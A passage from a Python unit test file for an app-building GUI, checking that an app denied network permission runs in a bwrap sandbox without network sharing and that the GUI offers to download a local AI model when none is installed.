                                                                       side_effect=lambda n: "/usr/bin/bwrap" if n == "bwrap" else None):
            self.window.run_current()  # network left unchecked -> request withdrawn, app runs offline
        argv = popen.call_args[0][0]
        self.assertEqual(argv[0], "bwrap")
        self.assertNotIn("--share-net", argv)
        self.assertFalse(apps.load("shopping").permissions["network"])

    def test_without_model_offers_download(self):
        with mock.patch.object(gui, "model_installed", lambda: False):
            self.ask("build an app for a shopping list")
        self.assertIn("local AI model", self.texts())
